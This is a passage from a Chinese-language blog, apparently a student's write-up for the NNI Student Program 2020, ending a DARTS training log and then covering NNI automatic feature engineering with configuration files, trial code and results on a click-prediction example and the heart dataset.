class="line">[2021-02-22 21:39:17] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 010&#x2F;520 Loss 0.063 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:19] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 020&#x2F;520 Loss 0.061 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:22] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 030&#x2F;520 Loss 0.064 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:24] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 040&#x2F;520 Loss 0.065 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:26] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 050&#x2F;520 Loss 0.065 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:29] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 060&#x2F;520 Loss 0.065 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:31] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 070&#x2F;520 Loss 0.066 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:34] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 080&#x2F;520 Loss 0.066 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:36] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 090&#x2F;520 Loss 0.067 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:39] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 100&#x2F;520 Loss 0.067 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:41] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 110&#x2F;520 Loss 0.069 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:43] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 120&#x2F;520 Loss 0.069 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:46] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 130&#x2F;520 Loss 0.069 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:48] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 140&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:51] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 150&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:53] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 160&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:55] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 170&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:58] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 180&#x2F;520 Loss 0.072 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:00] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 190&#x2F;520 Loss 0.072 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:03] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 200&#x2F;520 Loss 0.072 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:05] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 210&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:08] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 220&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:10] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 230&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:12] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 240&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:15] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 250&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:17] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 260&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:20] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 270&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:22] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 280&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:24] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 290&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:27] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 300&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:29] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 310&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:32] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 320&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:34] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 330&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:36] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 340&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:39] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 350&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:41] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 360&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:44] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 370&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:46] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 380&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:49] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 390&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:51] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 400&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:53] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 410&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:56] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 420&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:58] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 430&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:01] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 440&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:03] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 450&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:05] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 460&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:08] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 470&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:10] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 480&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:13] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 490&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:15] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 500&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:18] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 510&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:20] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 520&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:20] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Final Prec@1 98.7720%</span><br><span class="line">[2021-02-22 21:41:20] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 000&#x2F;104 Loss 0.150 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:21] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 010&#x2F;104 Loss 0.114 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:21] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 020&#x2F;104 Loss 0.136 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:22] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 030&#x2F;104 Loss 0.164 Prec@(1,5) (96.8%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:22] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 040&#x2F;104 Loss 0.160 Prec@(1,5) (96.9%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:23] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 050&#x2F;104 Loss 0.156 Prec@(1,5) (97.0%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:24] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 060&#x2F;104 Loss 0.151 Prec@(1,5) (97.1%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:24] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 070&#x2F;104 Loss 0.140 Prec@(1,5) (97.2%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:25] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 080&#x2F;104 Loss 0.143 Prec@(1,5) (97.2%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:25] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 090&#x2F;104 Loss 0.137 Prec@(1,5) (97.3%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:26] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 100&#x2F;104 Loss 0.139 Prec@(1,5) (97.3%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:26] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 104&#x2F;104 Loss 0.139 Prec@(1,5) (97.3%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:26] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Final Prec@1 97.2500%</span><br></pre></td></tr></table></figure>
<p>调用<code>nni.algorithms.nas.pytorch.darts.DartsTrainer</code>可进行DARTS的架构搜索。再通过<code>retrain.py</code>再次进行训练，最终在第454个epoch达到了97%的准确率，重训练过程中精确度最高能够达到98%。</p>
<p>由于DARTS的候选边在MobileNet中并没有出现，所以最终生成的模型相对变化较大，但与此同时，性能上的提升也十分明显。</p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><ul>
<li><p>我们使用了Google Colab上的GPU进行训练，通过NNI的官方文档提供的指导说明，通过反向代理访问到了NNI的Web UI，使得我们能够在有限的算力下完成NNI的有关实验。</p>
</li>
<li><p>在算力允许的条件下，每一次trial的epoch最好设置得足够大，这样所得的模型最终结果相对能够更加精确。</p>
</li>
<li><p>NNI在超参调优和神经网络架构搜索方面真正解决了用户痛点所在，省下了繁琐的人工调参以及模型优化时间，以更低的时间成本，更高的工作效率为相关学习研究提供很大的方便。</p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://garen-wang.top/2021/01/29/NNI-Student-Program-2020-Task3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/29/NNI-Student-Program-2020-Task3/" class="post-title-link" itemprop="url">NNI Student Program 2020 Task3</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-29 17:18:56" itemprop="dateCreated datePublished" datetime="2021-01-29T17:18:56+08:00">2021-01-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-03-18 21:26:59" itemprop="dateModified" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Task-3-进阶任务"><a href="#Task-3-进阶任务" class="headerlink" title="Task 3 进阶任务"></a>Task 3 进阶任务</h1><h2 id="特征工程简介"><a href="#特征工程简介" class="headerlink" title="特征工程简介"></a>特征工程简介</h2><p>有这么一句话在业界广泛流传：</p>
<blockquote>
<p>数据和特征决定了机器学习的上限，而模型和算法只是逼近这个上限而已。</p>
</blockquote>
<p>数据是特征的来源，特征是给定算法下模型精确度的最大决定因素，可见提升特征质量意义重大。</p>
<p>特征工程(Feature Engineering)是机器学习的一个重要分支，指的是通过多种数据处理方法，从原始数据提取出若干个能优秀反映问题的特征，以提升最终算法与模型准确率的过程。</p>
<h2 id="自动特征工程"><a href="#自动特征工程" class="headerlink" title="自动特征工程"></a>自动特征工程</h2><p>自动特征工程是一种新技术，是机器学习发展的一大步。自动特征工程能够在降低时间成本的同时，生成更优秀的特征，从而构建出准确率更高的模型。</p>
<p>利用NNI的自动特征工程实现，我们通过简单调用函数便可实现特征工程的自动调优。</p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
<li>nni</li>
<li>numpy</li>
<li>lightgbm: 微软开源算法</li>
<li>pandas: 基于python的数据分析强力工具</li>
<li>sklearn: 集成了特征工程相关的常用函数</li>
</ul>
<p>建议在conda环境下部署自动特征工程python环境。</p>
<p>此外，由于pandas版本更新，直接运行自带项目会报错，实际上只需修改<code>fe_util.py</code>中的<code>agg</code>参数类型即可，大致修改如下：</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def aggregate(df, num_col, col, stat_list = AGGREGATE_TYPE):</span><br><span class="line"><span class="deletion">-   agg_dict = &#123;&#125;</span></span><br><span class="line"><span class="addition">+   agg_list = []</span></span><br><span class="line">    for i in stat_list:</span><br><span class="line"><span class="deletion">-       agg_dict[(&#x27;AGG_&#123;&#125;_&#123;&#125;_&#123;&#125;&#x27;.format(i, num_col, col)] = i</span></span><br><span class="line"><span class="addition">+       agg_list.append((&#x27;AGG_&#123;&#125;_&#123;&#125;_&#123;&#125;&#x27;.format(i, num_col, col), i))</span></span><br><span class="line"><span class="deletion">-   agg_result = df.groupby([col])[num_col].agg(agg_dict)</span></span><br><span class="line"><span class="addition">+   agg.result = df.groupby([col])[num_col].agg(agg_list)</span></span><br><span class="line">    r = left_merge(df, agg_result, on = [col])</span><br><span class="line">    df = concat([df, r])</span><br><span class="line">    return df</span><br></pre></td></tr></table></figure>
<p>该修改已提交pull request至原项目。</p>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><h3 id="配置搜索空间"><a href="#配置搜索空间" class="headerlink" title="配置搜索空间"></a>配置搜索空间</h3><p>NNI的自动特征工程支持count、crosscount、aggregate等一阶与二阶特征运算，配置搜索空间时只需按json格式填写搜索范围。具体填写方法以项目示例搜索空间为例：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;count&quot;</span>:[</span><br><span class="line">        <span class="string">&quot;C1&quot;</span>,<span class="string">&quot;C2&quot;</span>,<span class="string">&quot;C3&quot;</span>,<span class="string">&quot;C4&quot;</span>,<span class="string">&quot;C5&quot;</span>,<span class="string">&quot;C6&quot;</span>,<span class="string">&quot;C7&quot;</span>,<span class="string">&quot;C8&quot;</span>,<span class="string">&quot;C9&quot;</span>,<span class="string">&quot;C10&quot;</span>,</span><br><span class="line">        <span class="string">&quot;C11&quot;</span>,<span class="string">&quot;C12&quot;</span>,<span class="string">&quot;C13&quot;</span>,<span class="string">&quot;C14&quot;</span>,<span class="string">&quot;C15&quot;</span>,<span class="string">&quot;C16&quot;</span>,<span class="string">&quot;C17&quot;</span>,<span class="string">&quot;C18&quot;</span>,<span class="string">&quot;C19&quot;</span>,</span><br><span class="line">        <span class="string">&quot;C20&quot;</span>,<span class="string">&quot;C21&quot;</span>,<span class="string">&quot;C22&quot;</span>,<span class="string">&quot;C23&quot;</span>,<span class="string">&quot;C24&quot;</span>,<span class="string">&quot;C25&quot;</span>,<span class="string">&quot;C26&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;aggregate&quot;</span>:[</span><br><span class="line">        [<span class="string">&quot;I9&quot;</span>,<span class="string">&quot;I10&quot;</span>,<span class="string">&quot;I11&quot;</span>,<span class="string">&quot;I12&quot;</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&quot;C1&quot;</span>,<span class="string">&quot;C2&quot;</span>,<span class="string">&quot;C3&quot;</span>,<span class="string">&quot;C4&quot;</span>,<span class="string">&quot;C5&quot;</span>,<span class="string">&quot;C6&quot;</span>,<span class="string">&quot;C7&quot;</span>,<span class="string">&quot;C8&quot;</span>,<span class="string">&quot;C9&quot;</span>,<span class="string">&quot;C10&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C11&quot;</span>,<span class="string">&quot;C12&quot;</span>,<span class="string">&quot;C13&quot;</span>,<span class="string">&quot;C14&quot;</span>,<span class="string">&quot;C15&quot;</span>,<span class="string">&quot;C16&quot;</span>,<span class="string">&quot;C17&quot;</span>,<span class="string">&quot;C18&quot;</span>,<span class="string">&quot;C19&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C20&quot;</span>,<span class="string">&quot;C21&quot;</span>,<span class="string">&quot;C22&quot;</span>,<span class="string">&quot;C23&quot;</span>,<span class="string">&quot;C24&quot;</span>,<span class="string">&quot;C25&quot;</span>,<span class="string">&quot;C26&quot;</span></span><br><span class="line">        ]</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;crosscount&quot;</span>:[</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&quot;C1&quot;</span>,<span class="string">&quot;C2&quot;</span>,<span class="string">&quot;C3&quot;</span>,<span class="string">&quot;C4&quot;</span>,<span class="string">&quot;C5&quot;</span>,<span class="string">&quot;C6&quot;</span>,<span class="string">&quot;C7&quot;</span>,<span class="string">&quot;C8&quot;</span>,<span class="string">&quot;C9&quot;</span>,<span class="string">&quot;C10&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C11&quot;</span>,<span class="string">&quot;C12&quot;</span>,<span class="string">&quot;C13&quot;</span>,<span class="string">&quot;C14&quot;</span>,<span class="string">&quot;C15&quot;</span>,<span class="string">&quot;C16&quot;</span>,<span class="string">&quot;C17&quot;</span>,<span class="string">&quot;C18&quot;</span>,<span class="string">&quot;C19&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C20&quot;</span>,<span class="string">&quot;C21&quot;</span>,<span class="string">&quot;C22&quot;</span>,<span class="string">&quot;C23&quot;</span>,<span class="string">&quot;C24&quot;</span>,<span class="string">&quot;C25&quot;</span>,<span class="string">&quot;C26&quot;</span></span><br><span class="line">        ],</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&quot;C1&quot;</span>,<span class="string">&quot;C2&quot;</span>,<span class="string">&quot;C3&quot;</span>,<span class="string">&quot;C4&quot;</span>,<span class="string">&quot;C5&quot;</span>,<span class="string">&quot;C6&quot;</span>,<span class="string">&quot;C7&quot;</span>,<span class="string">&quot;C8&quot;</span>,<span class="string">&quot;C9&quot;</span>,<span class="string">&quot;C10&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C11&quot;</span>,<span class="string">&quot;C12&quot;</span>,<span class="string">&quot;C13&quot;</span>,<span class="string">&quot;C14&quot;</span>,<span class="string">&quot;C15&quot;</span>,<span class="string">&quot;C16&quot;</span>,<span class="string">&quot;C17&quot;</span>,<span class="string">&quot;C18&quot;</span>,<span class="string">&quot;C19&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C20&quot;</span>,<span class="string">&quot;C21&quot;</span>,<span class="string">&quot;C22&quot;</span>,<span class="string">&quot;C23&quot;</span>,<span class="string">&quot;C24&quot;</span>,<span class="string">&quot;C25&quot;</span>,<span class="string">&quot;C26&quot;</span></span><br><span class="line">        ]</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="导入tuner"><a href="#导入tuner" class="headerlink" title="导入tuner"></a>导入tuner</h3><p>导入自动特征工程的tuner时，需要在<code>config.yml</code>中的<code>tuner</code>项添加相关信息，其他地方正常填写即可。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">tuner:</span></span><br><span class="line">  <span class="attr">codeDir:</span> <span class="string">.</span></span><br><span class="line">  <span class="attr">classFileName:</span> <span class="string">autofe_tuner.py</span></span><br><span class="line">  <span class="attr">className:</span> <span class="string">AutoFETuner</span></span><br><span class="line">  <span class="attr">classArgs:</span></span><br><span class="line">    <span class="attr">optimize_mode:</span> <span class="string">maximize</span></span><br></pre></td></tr></table></figure>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>Tuner在生成的搜索空间中随机选取一定数量的feature组合，通过<code>nni.get_next_parameter()</code>的接口，以dict的形式返回给单次trial。经一系列处理后运行lightGBM算法，得到最终以AUC形式呈现的结果。</p>
<p>调用代码主体部分如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get parameter from tuner</span></span><br><span class="line">RECEIVED_PARAMS = nni.get_next_parameter()</span><br><span class="line">logger.info(<span class="string">&quot;Received params:\n&quot;</span>, RECEIVED_PARAMS)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get sample column from parameter</span></span><br><span class="line">df = pd.read_csv(file_name)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;sample_feature&#x27;</span> <span class="keyword">in</span> RECEIVED_PARAMS.keys():</span><br><span class="line">    sample_col = RECEIVED_PARAMS[<span class="string">&#x27;sample_feature&#x27;</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sample_col = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># df: raw feaure + sample_feature</span></span><br><span class="line">df = name2feature(df, sample_col, target_name)</span><br><span class="line">feature_imp, val_score = lgb_model_train(df, _epoch=<span class="number">1000</span>, target_name=target_name,id_index=id_index)</span><br><span class="line"></span><br><span class="line"><span class="comment"># report result to nni</span></span><br><span class="line">nni.report_final_result(&#123;</span><br><span class="line">    <span class="string">&quot;default&quot;</span>:val_score, </span><br><span class="line">    <span class="string">&quot;feature_importance&quot;</span>:feature_imp</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="项目示例运行结果"><a href="#项目示例运行结果" class="headerlink" title="项目示例运行结果"></a>项目示例运行结果</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task3/task3_1.png">
<h3 id="Top-10-Trials"><a href="#Top-10-Trials" class="headerlink" title="Top 10 Trials"></a>Top 10 Trials</h3><img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task3/task3_2.png">
<h3 id="Default-Metric"><a href="#Default-Metric" class="headerlink" title="Default Metric"></a>Default Metric</h3><img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task3/task3_4.png">
<h3 id="Hyper-parameter"><a href="#Hyper-parameter" class="headerlink" title="Hyper-parameter"></a>Hyper-parameter</h3><img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task3/task3_6.png">
<h3 id="Feature-Importance-of-Top-1-Trial"><a href="#Feature-Importance-of-Top-1-Trial" class="headerlink" title="Feature Importance of Top 1 Trial"></a>Feature Importance of Top 1 Trial</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">         feature_name  split  ...  split_percent  feature_score</span><br><span class="line">5                  I6     39  ...      11.504425       0.145729</span><br><span class="line">4                  I5     20  ...       5.899705       0.067777</span><br><span class="line">85     AGG_max_I9_C17     14  ...       4.129794       0.053053</span><br><span class="line">76      count_C18_C23     11  ...       3.244838       0.031225</span><br><span class="line">43   AGG_mean_I11_C16      9  ...       2.654867       0.029425</span><br><span class="line">..                ...    ...  ...            ...            ...</span><br><span class="line">86    AGG_var_I11_C25      0  ...       0.000000       0.000000</span><br><span class="line">82      count_C12_C20      0  ...       0.000000       0.000000</span><br><span class="line">80       count_C1_C17      0  ...       0.000000       0.000000</span><br><span class="line">77       count_C1_C23      0  ...       0.000000       0.000000</span><br><span class="line">100     count_C15_C21      0  ...       0.000000       0.000000</span><br><span class="line"></span><br><span class="line">[162 rows x 6 columns]</span><br></pre></td></tr></table></figure>
<p>若想要查询某一次trial的feature importance，只需在WebUI中按下Copy as json，再代入原程序运行就可以获得了。</p>
<h2 id="heart数据集运行结果"><a href="#heart数据集运行结果" class="headerlink" title="heart数据集运行结果"></a>heart数据集运行结果</h2><p><a target="_blank" rel="noopener" href="http://archive.ics.uci.edu/ml/datasets/Statlog+%28Heart%29">数据集地址</a></p>
<p>heart数据集收集了中老年人是否患心脏病的270条数据，每条数据有13条属性，本质上是一个二分类问题的数据。</p>
<p>我们希望通过特征工程，从数据中挖掘出心脏病患病与其他事件的相关性，从庞杂的数据中得出结论。</p>
